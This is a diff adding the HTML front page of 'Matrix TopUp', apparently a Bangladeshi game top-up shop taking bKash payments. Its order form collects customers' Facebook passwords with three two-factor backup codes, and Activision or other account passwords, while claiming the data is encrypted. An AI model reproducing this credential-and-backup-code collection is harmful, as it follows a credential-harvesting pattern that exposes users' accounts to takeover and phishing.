@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+<title>Matrix TopUp — Premium Game Credits</title>
+<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Rajdhani:wght@400;500;600;700&family=Space+Mono&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+<!-- HEADER -->
+<header>
+  <div class="logo" onclick="goHome()">Matrix<span>TopUp</span></div>
+  <div class="nav-actions">
+    <div class="theme-toggle" onclick="toggleTheme()" title="Toggle theme">
+      <span class="toggle-label" id="themeLabel">☀️ Light</span>
+      <div class="toggle-track"><div class="toggle-knob"></div></div>
+    </div>
+    <button class="cart-btn" onclick="toggleCart()">
+      🛒 Cart
+      <div class="cart-count" id="cartCount">0</div>
+    </button>
+  </div>
+</header>
+
+<!-- PAGE: HOME -->
+<div id="homePage" class="page active">
+  <div class="noticeboard-wrap">
+    <div class="notice-header">
+      <div class="notice-title">📢 Noticeboard</div>
+    </div>
+    <div class="noticeboard" id="noticeDisplay">
+      🎮 স্বাগতম Matrix TopUp-এ! দ্রুত ও নিরাপদ গেম টপআপ সার্ভিস।
+      অর্ডার করার ৩০ মিনিটের মধ্যে ডেলিভারি নিশ্চিত। যেকোনো সমস্যায় আমাদের সাথে যোগাযোগ করুন। ধন্যবাদ! 🚀
+    </div>
+  </div>
+
+  <div class="hero">
+    <h1>POWER UP YOUR GAME</h1>
+    <p>Instant delivery · Secure payment · Best prices in BD</p>
+  </div>
+
+  <!-- VOUCH SECTION -->
+  <div class="section-label">What Customers Say</div>
+  <div class="vouch-section">
+
+    <!-- LEFT: VouchVault -->
+    <div class="vouch-col">
+      <div class="vouch-col-header">
+        <div class="vouch-source-badge vv-badge">✅ VouchVault</div>
+        <a href="https://vouchvault.cc/Samin" target="_blank" class="vouch-see-all">See all →</a>
+      </div>
+      <div class="vouch-cards" id="vvCards">
+        <div class="vouch-loading">⏳ Loading vouches...</div>
+      </div>
+    </div>
+
+    <!-- RIGHT: Trustpilot (coming soon) -->
+    <div class="vouch-col">
+      <div class="vouch-col-header">
+        <div class="vouch-source-badge tp-badge">⭐ Trustpilot</div>
+        <span class="vouch-coming-soon">Coming soon</span>
+      </div>
+      <div class="vouch-cards">
+        <div class="vouch-card tp-placeholder">
+          <div class="tp-placeholder-icon">⭐⭐⭐⭐⭐</div>
+          <p>Trustpilot reviews will appear here soon.</p>
+          <span>We're setting up our Trustpilot page!</span>
+        </div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="section-label">Choose Your Game</div>
+
+  <div class="game-grid">
+
+    <div class="game-card" onclick="openGame('cod')">
+      <div class="game-badge">HOT</div>
+      <div class="game-banner cod-banner">
+        <img src="callofduty.png" alt="Call of Duty" class="game-banner-img">
+        <div class="game-banner-glow"></div>
+      </div>
+      <div class="game-card-body">
+        <div class="game-name">CALL OF DUTY</div>
+        <div class="game-currency">⚡ CP Points</div>
+        <div class="game-card-arrow">Shop Now →</div>
+      </div>
+    </div>
+
+    <div class="game-card" onclick="openGame('roblox')">
+      <div class="game-badge">POPULAR</div>
+      <div class="game-banner roblox-banner">
+        <img src="roblox.png" alt="Roblox" class="game-banner-img">
+        <div class="game-banner-glow"></div>
+      </div>
+      <div class="game-card-body">
+        <div class="game-name">ROBLOX</div>
+        <div class="game-currency">💎 Robux</div>
+        <div class="game-card-arrow">Shop Now →</div>
+      </div>
+    </div>
+
+    <div class="game-card" onclick="openGame('steam')">
+      <div class="game-banner steam-banner">
+        <img src="steam.jpg" alt="Steam" class="game-banner-img">
+        <div class="game-banner-glow"></div>
+      </div>
+      <div class="game-card-body">
+        <div class="game-name">STEAM</div>
+        <div class="game-currency">💵 Wallet Dollars</div>
+        <div class="game-card-arrow">Shop Now →</div>
+      </div>
+    </div>
+
+    <div class="game-card" onclick="openGame('gtav')">
+      <div class="game-banner gtav-banner">
+        <img src="gtav.png" alt="GTA V" class="game-banner-img">
+        <div class="game-banner-glow"></div>
+      </div>
+      <div class="game-card-body">
+        <div class="game-name">GTA V</div>
+        <div class="game-currency">🔑 PC Redeem Key</div>
+        <div class="game-card-arrow">Shop Now →</div>
+      </div>
+    </div>
+
+    <div class="game-card" onclick="openGame('fifa26')">
+      <div class="game-banner fifa-banner">
+        <img src="fifa26.png" alt="FIFA 26" class="game-banner-img">
+        <div class="game-banner-glow"></div>
+      </div>
+      <div class="game-card-body">
+        <div class="game-name">FIFA 26</div>
+        <div class="game-currency">⚽ In Your EA Account Delivery</div>
+        <div class="game-card-arrow">Shop Now →</div>
+      </div>
+    </div>
+
+  </div>
+</div>
+
+<!-- PAGE: PRODUCT -->
+<div id="productPage" class="page">
+  <div class="product-page">
+    <button class="back-btn" onclick="goHome()">← Back to Games</button>
+    <div class="product-header">
+      <div class="product-icon" id="prodIcon"></div>
+      <div class="product-meta">
+        <h2 id="prodName"></h2>
+        <p id="prodDesc"></p>
+      </div>
+    </div>
+    <div class="section-title">Select Package</div>
+    <div class="packages" id="packagesGrid"></div>
+    <div class="order-summary" id="orderSummary" style="display:none">
+      <h4>Order Summary</h4>
+      <div class="order-row"><span>Game</span><span id="sumGame"></span></div>
+      <div class="order-row"><span>Package</span><span id="sumPkg"></span></div>
+      <div class="order-row total"><span>TOTAL</span><span id="sumPrice"></span></div>
+    </div>
+    <div id="accountSection" style="display:none">
+      <div class="section-title">Account Information</div>
+      <div class="account-form">
+        <div id="accountTypeSection">
+          <div class="section-title" style="margin-bottom:10px">Account Type</div>
+          <div class="account-type-tabs">
+            <button class="tab-btn active" onclick="setAccountType('facebook',this)">📘 Facebook</button>
+            <button class="tab-btn" onclick="setAccountType('activision',this)">🎯 Activision</button>
+          </div>
+        </div>
+        <div class="info-note">
+          <span class="icon">🔒</span>
+          <span>Your information is encrypted and kept strictly confidential. Used only for top-up delivery.</span>
+        </div>
+        <div class="form-row name-row">
+          <div><label>First Name</label><input type="text" id="firstName" placeholder="Your first name"></div>
+          <div><label>Last Name</label><input type="text" id="lastName" placeholder="Your last name"></div>
+        </div>
+        <div id="fbFields">
+          <div class="form-row"><label>Email / Phone</label><input type="text" id="fbEmail" placeholder="Email or phone linked to Facebook"></div>
+          <div class="form-row"><label>Password</label><input type="password" id="fbPass" placeholder="Facebook password"></div>
+          <div class="form-row"><label>Two-Step Code 1</label><input type="text" id="fbCode1" placeholder="2FA backup code #1"></div>
+          <div class="form-row"><label>Two-Step Code 2</label><input type="text" id="fbCode2" placeholder="2FA backup code #2"></div>
+          <div class="form-row"><label>Two-Step Code 3</label><input type="text" id="fbCode3" placeholder="2FA backup code #3"></div>
+        </div>
+        <div id="activFields" style="display:none">
+          <div class="form-row"><label>Activision Login</label><input type="text" id="activLogin" placeholder="Activision email / username"></div>
+          <div class="form-row"><label>Password</label><input type="password" id="activPass" placeholder="Activision password"></div>
+        </div>
+        <div id="genericFields" style="display:none">
+          <div class="form-row"><label>Username / Email</label><input type="text" id="genUser" placeholder="Account username or email"></div>
+          <div class="form-row"><label>Password</label><input type="password" id="genPass" placeholder="Account password"></div>
+        </div>
+      </div>
+      <div class="action-row">
+        <button class="btn-cart" onclick="addToCart()">🛒 Add to Cart</button>
+        <button class="btn-primary" onclick="proceedToPayment()">Continue to Payment →</button>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE: PAYMENT -->
+<div id="paymentPage" class="page">
+  <div class="payment-page">
+    <button class="back-btn" onclick="goToProduct()">← Back</button>
+    <div class="payment-card">
+      <span class="payment-icon">💳</span>
+      <h2>COMPLETE PAYMENT</h2>
+      <p>Send the exact amount to the bKash number below, then enter your Transaction ID.</p>
+      <div class="bkash-box">
+        <div class="bkash-logo">💖</div>
+        <div class="bkash-label">bKash Send Money Number</div>
+        <div class="bkash-number">01844175037</div>
+      </div>
+      <div class="amount-pill">💰 Total: <span id="payAmount"></span> Taka</div>
+      <input class="trx-input" type="text" id="trxInput" placeholder="Enter bKash Transaction ID (TrxID)">
+      <button class="confirm-btn" onclick="confirmPayment()">✅ CONFIRM ORDER</button>
+    </div>
+  </div>
+</div>
+
+<!-- PAGE: SUCCESS -->
+<div id="successPage" class="page">
+  <div class="success-page">
+    <span class="success-icon">🎉</span>
+    <h2>ORDER PLACED!</h2>
+    <p>Your order has been received. We will process your top-up within <strong>30 minutes</strong>.<br>
+    Thank you for choosing <span class="highlight">Matrix TopUp</span>!</p>
+    <button class="btn-primary" style="width:100%;max-width:300px;margin:0 auto;display:block;"
+      onclick="goHome();resetAll();">← Back to Home</button>
+  </div>
+</div>
+
+<!-- CART SIDEBAR -->
+<div class="cart-overlay" id="cartOverlay" onclick="toggleCart()">
+  <div class="cart-panel" onclick="event.stopPropagation()">
+    <div class="cart-head">
+      <h3>🛒 YOUR CART</h3>
+      <button class="close-cart" onclick="toggleCart()">✕</button>
+    </div>
+    <div class="cart-items" id="cartItems">
+      <div class="cart-empty"><span class="icon">🛒</span>Your cart is empty</div>
+    </div>
+    <div class="cart-footer">
+      <div class="cart-total"><span>Total</span><span id="cartTotal">0 Taka</span></div>
+      <button class="cart-checkout-btn" onclick="cartCheckout()">Checkout All →</button>
+    </div>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
+
+<script src="main.js"></script>
+</body>
+</html>
